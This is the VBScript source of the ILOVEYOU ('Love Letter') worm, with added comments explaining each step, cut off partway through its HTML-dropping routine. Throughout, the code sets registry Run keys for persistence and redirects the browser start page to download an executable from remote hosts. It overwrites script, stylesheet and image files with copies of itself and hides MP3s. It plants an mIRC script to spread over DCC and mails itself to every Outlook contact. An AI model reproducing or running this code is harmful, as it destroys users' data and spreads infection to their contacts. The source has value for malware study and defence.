rem  barok -loveletter(vbe) < i hate go to school>
rem    by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /
Manila,Philippines
'Comments begining with ' added by The Hidden May 4 2000
On Error Resume Next
dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow

eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll

main()


sub main()
  On Error Resume Next
  dim wscr,rr
  set wscr=CreateObject("WScript.Shell")
  'check the time out value for WSH
  rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting
Host\Settings\Timeout")
  if (rr>=1) then
    ' Set script time out to infinity
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting
Host\Settings\Timeout", 0, "REG_DWORD"
  end if
  'Create three copies of the script in the windows, system32 and temp folders
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\MSKernel32.vbs")
  c.Copy(dirwin&"\Win32DLL.vbs")
  c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
  'Set IE default page to 1 of four locations that downloads an executable.
  'If the exectuable has already been downloaded set it to run at the next
login and set IE's start page to be blank
  regruns()
  'create an html file that possibly runs an activex component and runs one of 
the copies of the script
  html()
  'Resend script to people in the WAB
  spreadtoemail()
  'overwrite a number of file types with the script
  'if the files are not already scripts create a script file with the same name
with vbs extention and
  'delete the original file
  'mirc client have a script added to send the html file created earlier to a
channel
  listadriv()
end sub



sub regruns()
  On Error Resume Next
  Dim num, downread
  regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",d
irsy stem&"\MSKernel32.vbs"
  regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32
DLL" ,dirwin&"\Win32DLL.vbs"
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet
Explorer\Download Directory")
  if (downread = "") then
    downread = "c:\"
  end if
  if (fileexist(dirsystem&"\WinFAT32.exe") = 1) then
    Randomize
    num = Int((4 * Rnd) + 1)
    if num = 1 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw65
8734 5gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    elseif num = 2 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546
7863 24hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    elseif num = 3 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOh
fgER 67b3Vbvg/WIN-BUGSFIX.exe"
    elseif num = 4 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUg
qwer asdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    end if
  end if
  if (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) then
    regcreate
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",
downread & "\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet
Explorer\Main\Start Page", "about:blank"
  end if
end sub

sub listadriv
  On Error Resume Next
  Dim d,dc,s
  Set dc = fso.Drives
  For Each d in dc
    If d.DriveType = 2 or d.DriveType=3 Then
      folderlist(d.path & "\")
    end if
  Next
  listadriv = s
end sub

sub infectfiles(folderspec)
  On Error Resume Next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
  set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)
    if (ext = "vbs") or (ext = "vbe") then
      set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
    elseif(ext = "js") or (ext = "jse") or (ext = "css") or _
          (ext = "wsh") or (ext = "sct") or (ext = "hta") then
      set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
      bname = fso.GetBaseName(f1.path)
      set cop = fso.GetFile(f1.path)
      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)
    elseif(ext = "jpg") or (ext = "jpeg") then
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.write vbscopy
      ap.close
      set cop=fso.GetFile(f1.path)
      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    elseif(ext="mp3") or (ext="mp2") then
      set mp3 = fso.CreateTextFile(f1.path & ".vbs")
      mp3.write vbscopy
      mp3.close
      set att = fso.GetFile(f1.path)
      att.attributes = att.attributes + 2
    end if
    if (eq<>folderspec) then
      if (s = "mirc32.exe") or (s = "mlink32.exe") or (s = "mirc.ini") or _
         (s = "script.ini") or (s = "mirc.hlp") then
        set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will
corrupt, if mIRC will"
        scriptini.WriteLine "     corrupt... WINDOWS will affect and will not
run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick
"&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close
        eq=folderspec
      end if
    end if
  next
end sub

sub folderlist(folderspec)
  On Error Resume Next
  dim f,f1,sf
  set f = fso.GetFolder(folderspec)
  set sf = f.SubFolders
  for each f1 in sf
    infectfiles(f1.path)
    folderlist(f1.path)
  next
end sub

sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function

function fileexist(filespec)
  On Error Resume Next
  dim msg
  if (fso.FileExists(filespec)) Then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

function folderexist(folderspec)
  On Error Resume Next
  dim msg
  if (fso.GetFolderExists(folderspec)) then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

sub spreadtoemail()
  On Error Resume Next
  dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
  set regedit = CreateObject("WScript.Shell")
  set out = WScript.CreateObject("Outlook.Application")
  set mapi = out.GetNameSpace("MAPI")
  for ctrlists = 1 to mapi.AddressLists.Count
    set a = mapi.AddressLists(ctrlists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
    if (regv = "") then
      regv = 1
    end if
    if (int(a.AddressEntries.Count) > int(regv)) then
      for ctrentries = 1 to a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" &
malead)
        if (regad = "") then
          set male = out.CreateItem(0)
          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming
from me."
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
          male.Send
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &
malead, 1, "REG_DWORD"
        end if
        x = x + 1
      next
      regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    else
      regedit.RegWrite
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    end if
  next
  Set out = Nothing
  Set mapi = Nothing
end sub

sub html
  On Error Resume Next
  dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
  dta1= "
